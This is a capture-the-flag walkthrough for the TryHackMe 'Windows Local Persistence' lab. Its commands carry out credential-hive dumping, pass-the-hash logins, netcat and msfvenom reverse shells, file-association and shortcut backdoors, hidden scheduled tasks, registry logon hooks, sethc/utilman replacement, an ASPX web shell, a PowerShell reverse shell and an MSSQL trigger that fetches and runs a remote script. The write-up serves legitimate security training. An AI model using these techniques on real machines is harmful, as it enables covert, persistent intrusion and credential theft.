![Windows Local Persistence Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Cover.png" alt="Windows Local Persistence Logo">
</p>

# Windows Local Persistence

This guide contains the answer and steps necessary to get to them for the [Windows Local Persistence](https://tryhackme.com/r/room/windowslocalpersistence) room.

## Table of contents

- [Tampering With Unprivileged Accounts](#tampering-with-unprivileged-accounts)
- [Backdooring Files](#backdooring-files)
- [Abusing Services](#abusing-services)
- [Abusing Scheduled Tasks](#abusing-scheduled-tasks)
- [Logon Triggered Persistence](#logon-triggered-persistence)
- [Backdooring the Login Screen / RDP](#backdooring-the-login-screen--rdp)
- [Persisting Through Existing Services](#persisting-through-existing-services)

### Tampering With Unprivileged Accounts

1. Insert flag1 here

   The first thing we need to do, is add the thmuser1 to the "Backup Operators" and the "Remote Management Users" groups. This can be done through the Administrator account.

   ```console
   net localgroup "Backup Operators" thmuser1 /add
   
   net localgroup "Remote Management Users" thmuser1 /add
   ```

   ![Tampering Add User](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Add_User.png)

   We also need to disable the LocalAccountTokenFilterPolicy.

   ```console
   reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
   ```

   ![Tampering Change Policy](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Change_Policy.png)

   Now we have access to the SAM and SYSTEM files. Lets export them from the registry and download them to our machine.

   ```console
   reg save hklm\system system.bak
   reg save hklm\sam sam.bak

   download system.bak
   download sam.bak
   ```

   ![Tampering Download](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Download.png)

   After downloading, we can use the `secretsdump.py` file to dump the hashes from the hives.

   ```console
   python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
   ```

   With the found Administrator hash (only the last part), we can use a pass-the-hash method to login withn WinRM.

   ```console
   evil-winrm -i 10.10.112.47 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
   ```

   Success! Now we can execute the flag file.

   ![Tampering Flag1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Flag1.png)

   ><details><summary>Click for answer</summary>THM{FLAG_BACKED_UP!}</details>

2. Insert flag2 here

   First, we add the required privileges (SeBackupPrivilege and SeRestorePrivilege) to the account through the Administrator account.

   ```console
   secedit /export /cfg config.ini
   ```

   ![Tampering Config](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Config.png)

   Now we must load this configuration back into the system.

   ```console
   secedit /import /cfg config.ini /db config.db
   secedit /configure /db config.db /cfg config.ini
   ```

   Lastly, we change the descriptor for WinRM so the user can use it. Add the user (thmuser2) and make sure it has full control.

   ```console
   Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
   ```

   ![Tampering Descriptor](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Descriptor.png)

   After having done that, we can login with this user and export and dump the hashes from the accounts as done in the previous question.

   Now login with the obtained Administrator hash and find our second flag.
   
   ![Tampering Flag2 Error](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Flag2_Error.png)

   Unfortunately, there seems to be something missing. But the privileges are enabled for my account...

   ![Tampering Flag2 Error 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Flag2_Error_2.png)

   We'll have to get back on this one.

   ><details><summary>Click for answer</summary>Answer found online is: THM{IM_JUST_A_NORMAL_USER}</details>

3. Insert flag3 here

   First we need to open regedit with SYSTEM privileges. We will use `PsExec` for this.

   ```cmd
   PsExec.exe -i -s regedit
   ```

   ![Rid Regedit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Rid_Regedit.png)

   Here we see a list of users. We are interested in `thmuser3`. So we need to find the correct one. 

   Using `wmic` we can find the RIDs of all users.

   ```cmd
   wmic useraccount get name,sid
   ```

   ![Rid Users](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Rid_Users.png)

   `thmuser3` has RID 1010. Converting this into its hex value (base16) gives us `3f2`. 
   
   ![Rid Hex Value](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Rid_Hex_Value.png)
   
   This can also be found in regedit under the users tab.

   ![Rid Regedit User Hex](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Rid_Regedit_User_Hex.png)

   Under the F key, we can see the RID data for this user. At position 30 (0x30) we can see the RID stored with little endian notation (e.g., f2 03).

   ![Rid Old Value](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Rid_Old_Value.png)

   We must change this to that of the Administrators account which is 1F4 (this can be found under the users tab in regedit). Remember to reverse the numbers (f4 01).

   ![Rid New Value](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Rid_New_Value.png)

   Unfortunately, the machine seems to have crashed. So I had to restart the machine and re-do these steps.
   
   After trying again, it still won't work...
   
   ==================================================================
   The following steps did not work...
   
   Now we can log into the machine with RDP and the `thmuser3` credentials. 

   RID LOGIN THMUSER3

   It appears we have indeed Admin privileges as our terminal is started in system32. Lets try and get our flag.

   RID FLAG 3

   ><details><summary>Click for answer</summary>Answer found online is: THM{TRUST_ME_IM_AN_ADMIN}</details>

### Backdooring Files

1. Insert flag5 here

   Lets first create a Powershell script which will create a reverse shell and afterwards opens calculator as if nothing happened.

   ![Backdoor Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Script.png)

   Don't forget to add your IP and port. Save it to the same folder as the calc shortcut (system32).

   Now we must alter the shortcut to link to our script. The target should be:

   ```console
   powershell.exe -WindowStyle hidden C:\Windows\system32\backdoor.ps1
   ```

   ![Backdoor Shortcut](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Shortcut.png)

   Notice that the shortcut icon has changed to a powershell icon. Lets revert this to avoid suspicion.

   ![Backdoor Shortcut Icon](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Shortcut_Icon.png)

   Now we can start out listener with: `nc -nlvp 1337` and execute the shortcut. If we get a connection we can retrieve our flag.

   ![Backdoor Flag5](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Flag5)

   ><details><summary>Click for answer</summary>THM{NO_SHORTCUTS_IN_LIFE}
</details>

2. Insert flag6 here

   For this we need a script which is slightly different.

   ```powershell
   Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.18.78.136 1337"
   C:\Windows\system32\NOTEPAD.EXE $args[0]
   ```
   
   ![Backdoor Script2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Script2.png)

   Now we must change the file type association of a .txt file.

   We must change the open command for `txtfile` to the following:

   ```powershell
   powershell -windowstyle hidden C:\Windows\backdoor2.ps1 %1
   ```

   ![Backdoor Txtfile](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Txtfile.png)

   Next we create a text file on the desktop and setup our listener on our machine with `nc -nlvp 1337`. Finally, we should get a connection when opening the text file.

   ![Backdoor Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Reverse_Shell.png)

   All thats left to do now, is get our flag.

   ![Backdoor Flag6](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Flag6.png)

   ><details><summary>Click for answer</summary>THM{TXT_FILES_WOULD_NEVER_HURT_YOU}</details>

### Abusing Services

1. Insert flag7 here

   First thing to do is create a payload that will give us a reverse shell upon executing. Make sure the type is set to windows service.

   ```console
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f exe-service -o rev-svc.exe    
   ```
   
   ![Abusing Service Msfvenum](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Msfvenum.png)

   Now we can transfer this file to the target system. 

   ```powershell
   evil-winrm -i 10.10.163.79 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
   
   upload /home/kali/rev-svc.exe C:\Windows\rev-svc.exe
   ```

   ![Abusing Service Transfer](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Transfer.png)

   Next we must create a new service that points to this executable and starts at launch.

   ```powershell
   sc.exe create THMservice2 binPath= "C:\Windows\rev-svc.exe" start= auto
   ```

   ![Abusing Service Create](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Create.png)

   Before starting this service, we should setup a listener with `nc` `nc -nlvp 1337`.

   ```powershell
   sc.exe start THMservice2
   ```
   
   ![Abusing Service Start](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Start.png)

   Now that we have a connection, we can get our flag.

   ![Abusing Service Flag7](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Flag7.png)

   ><details><summary>Click for answer</summary>THM{SUSPICIOUS_SERVICES}</details>

2. Insert flag8 here

   To find a suitable service to modify, we should check for any stopped services. Instead of looking through all services, we know there is one named `THMservice`.
   
   ```powershell
   sc.exe query state= all
   sc.exe query thmservice2
   sc.exe query thmservice3
   sc.exe qc thmservice3
   ```
   
   ![Abusing Service Services](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Services.png)

   We see we only need to change the binpath and account name it will run as.

   ```powershell
   sc.exe config thmservice3 binPath= "C:\Windows\rev-svc.exe" obj= "LocalSystem"
   ```
   
   ![Abusing Service Modify](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Modify.png)

   After starting out listener again, we can start the service to get a connection back.

   ```powershell
   nc -nlvp 1337
   sc.exe start THMservice3
   ```
   
   ![Abusing Service Start2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Start2.png)

   Now we can get our flag!

   ![Abusing Service Flag8](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Flag8.png)

   ><details><summary>Click for answer</summary>THM{IN_PLAIN_SIGHT}</details>

### Abusing Scheduled Tasks

1. Insert flag9 here

   We can use the following command to create a task that will run every minute and creates a netcat connection back to our system.
   
   ```powershell
   schtasks /create /sc minute /mo 1 /tn THM-TaskBackDoor /tr "C:\tools\nc64 -e cmd.exe 10.18.78.136 1337" /ru SYSTEM
   ```

   ![Tasks Create](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Tasks_Create.png)

   We can check if it was properly created with `schtasks` as well.
   
   ```powershell
   schtasks /query /tn THM-TaskBackDoor
   ```

   This is already enough for the flag. But we can still try and hide this task. This can be done by either removing or renaming its security descriptor.
   
   Open regedit with SYSTEM privileges using `PsExec`:
   
   ```powershell
   C:\tools\pstools\PsExec.exe -i -s regedit
   ```

   Now navigate to `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\THM-TaskBackDoor` and remove or rename the SD key.
   
   ![Tasks Descriptor](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Tasks_Descriptor.png)

   Querying the task again, should now give us an error.
   
   ![Tasks Error](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Tasks_Error.png)

   Al that is left to do now, is setup our `nc` listener and wait for the task to run again.

   ![Tasks Flag9](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Tasks_Flag9.png)

   ><details><summary>Click for answer</summary>THM{JUST_A_MATTER_OF_TIME}</details>

### Logon Triggered Persistence

1. Insert flag10 here

   We need to create another payload which is of type exe (not exe-service).

   ```console
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f exe -o revshell.exe
   ```

   Create an http server and transfer it to our target machine.

   ```console
   python3 -m http.server 8080
   
   wget http://10.18.78.136:8080/revshell.exe -O revshell.exe
   ```

   ![Logon Startup Transfer](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Startup_Transfer.png)

   Now copy this file to the startup folder for all users:

   ```powershell
   copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\revshell.exe"
   ```

   ![Logon Startup Copy](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Startup_Copy.png)

   Before loging out, make sure to disable the previously created task or it might interfere. Then logout of the machine and remote back in.

   If you setup a listener first, you should get a connection back.

   ![Logon Startup Login](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Startup_Login.png)

   And we can get our 10th flag.

   ![Logon Startup Flag10](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Startup_Flag10.png)

   ><details><summary>Click for answer</summary>THM{NO_NO_AFTER_YOU}</details>

2. Insert flag11 here

   We can use the same file, but lets move it so the startup folder doesn't execute it as well.

   ```console
   move "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\revshell.exe" "C:\Windows\revshell.exe"
   ```

   ![Logon Run Move](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Run_Move.png)

   Now we must add a key to the registry telling windows to execute the file on login. We'll place it in the folder for all users. `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`

   Make sure to add it as an expandable variable with name `MyBackdoor`

   ![Logon Run Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Run_Registry.png)

   After loggin in again (and setting up a listener), we should be able to get our flag.
   
   ![Logon Run Flag11](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Run_Flag11.png)

   ><details><summary>Click for answer</summary>THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}</details>

3. Insert flag12 here

   We can use the same payload as in the previous question. We don't need to move it either.

   What we need to do is modify the userinit key in the winlogon folder of the registry to include our payload.

   Navigate to `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` in the registry.

   Append the `userinit` value with `, C:\Windows\revshell.exe`.

   ![Logon Winlogon Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Winlogon_Registry.png)

   Don't forget to remove the run value we added in the previous question. Logout and back in again and we should be able to get our flag.

   ![Logon Winlogon Flag12](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Winlogon_Flag12.png)

   ><details><summary>Click for answer</summary>THM{I_INSIST_GO_FIRST}</details>

4. Insert flag13 here

   We can use the same payload as in the previous question. We don't need to move it either.

   Navigate to `HKCU\Environment` and add en expandable string value called `UserInitMprLogonScript` and have it point to our payload.
   
   ![Logon Scripts Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Scripts_Registry.png)

   Don't forget to remove the userinit value we added in the previous question. Logout and back in again and we should be able to get our flag.

   ![Logon Scripts Flag13](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Scripts_Flag13.png)z

   ><details><summary>Click for answer</summary>THM{USER_TRIGGERED_PERSISTENCE_FTW}</details>

### Backdooring the Login Screen / RDP

1. Insert flag14 here

   In order for this exploit to work, we need to take ownership of sethc.exe and give the admin account permission to modify it. Then make a backup just in case and overwrite the original with cmd.exe
   
   ```cmd
   takeown /F C:\Windows\system32\sethc.exe
   icacls C:\Windows\system32\sethc.exe /grant Administrator:F
   
   copy C:\Windows\system32\sethc.exe C:\Windows\system32\sethc.exe.bak
   copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe
   ```

   ![Login Screen Ownership](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Login_Screen_Ownership.png)

   Now we lock the machine, hit `shift` 5 times and we should get a command prompt.
   
   ![Login Screen Cmd](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Login_Screen_Cmd.png)

   Now we can get our flag.

   ![Login Screen Flag14](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Login_Screen_Flag14.png)

   ><details><summary>Click for answer</summary>THM{BREAKING_THROUGH_LOGIN}</details>

2. Insert flag15 here

   In order for this exploit to work, we need to take ownership of utilman.exe and give the admin account permission to modify it. Then make a backup just in case and overwrite the original with cmd.exe
   
   ```cmd
   takeown /F C:\Windows\system32\utilman.exe
   icacls C:\Windows\system32\utilman.exe /grant Administrator:F
   
   copy C:\Windows\system32\utilman.exe C:\Windows\system32\utilman.exe.bak
   copy C:\Windows\system32\cmd.exe C:\Windows\system32\utilman.exe
   ```
   
   ![Login Screen Utilman](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Login_Screen_Utilman.png)

   Now we lock the machine and click the accessibility icon to receive a command prompt.

   ![Login Screen Cmd2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Login_Screen_Cmd2.png)

   Now we can get our flag.

   ![Login Screen Flag15](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Login_Screen_Flag15.png)

   ><details><summary>Click for answer</summary>THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}</details>

### Persisting Through Existing Services

1. Insert flag16 here

   We can use the webshell provided in the [link](https://github.com/tennc/webshell/raw/master/fuzzdb-webshell/asp/cmdasp.aspx). Setup an http server and transfer the file to the target machine.
   
   ```console
   curl http://10.10.112.63:8080/shell.aspx -o shell.aspx
   move shell.aspx C:\inetpub\wwwroot\shell.aspx
   ```

   ![Persisting Webshell Transfer](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Persisting_Webshell_Transfer.png)

   If we now head to http://10.10.100.83/shell.aspx we should be able to access the shell.
   
   ![Persisting Webshell Denied](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Persisting_Webshell_Denied.png)

   Unfortunately, we are denied access to the file. This might be due to permission not transfering over. Lets change that
   
   ```console
   icacls C:\inetpub\wwwroot\shell.aspx /grant Everyone:F
   ```

   ![Persisting Webshell Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Persisting_Webshell_Permissions.png)

   Trying again, does give us access to the shell.
   
   ![Persisting Webshell Access](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Persisting_Webshell_Access.png)

   We can now get our 16th flag.

   ![Persisting Webshell Flag16](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Persisting_Webshell_Flag16.png)

   ><details><summary>Click for answer</summary>THM{EZ_WEB_PERSISTENCE}</details>

2. Insert flag17 here

   Lets first create our powershell script. Make sure to use the correct ip and port.

   ![Persisting Mssql Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Persisting_Mssql_Script.png)

   ```powershell
   $client = New-Object System.Net.Sockets.TCPClient("10.10.112.63",1337);

   $stream = $client.GetStream();
   [byte[]]$bytes = 0..65535|%{0};
   while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
      $sendback = (iex $data 2>&1 | Out-String );
      $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
      $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
      $stream.Write($sendbyte,0,$sendbyte.Length);
       $stream.Flush()
   };

   $client.Close()
   ```

   Now we must prepare the SQL database. Start the Microsoft SQL Management Service and create a new query to enable xp_cmdshell.

   ```sql
   sp_configure 'Show Advanced Options',1;
   RECONFIGURE;
   GO

   sp_configure 'xp_cmdshell',1;
   RECONFIGURE;
   GO
   ```

   ![Persisting Mssql Reconfigure](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Persisting_Mssql_Reconfigure.png)
   
   Next, we must grant all users the ability to impersonate the sa user.
   
   ```sql
   USE master

   GRANT IMPERSONATE ON LOGIN::sa to [Public];
   ```

   ![Persisting Mssql Impersonate](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Persisting_Mssql_Impersonate.png)

   Now we must select the `HRDB` database and create our trigger.
   
   ```sql
   USE HRDB

   CREATE TRIGGER [sql_backdoor]
   ON HRDB.dbo.Employees 
   FOR INSERT AS

   EXECUTE AS LOGIN = 'sa'
   EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://10.10.112.63:8080/evilscript.ps1'')"';
   ```
   
   ![Persisting Mssql Trigger](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Persisting_Mssql_Trigger.png)

   All that is left now, is to add a new employee into the database. This can be done from the root webpage (http://10.10.100.83).
   
   ![Persisting Mssql Access](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Persisting_Mssql_Access.png)

   Now we can get our final flag.

   ![Persisting Mssql Flag17](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowslocalpersistence/Windows_Local_Persistence_Persisting_Mssql_Flag17.png)

   ><details><summary>Click for answer</summary>THM{I_LIVE_IN_YOUR_DATABASE}</details>

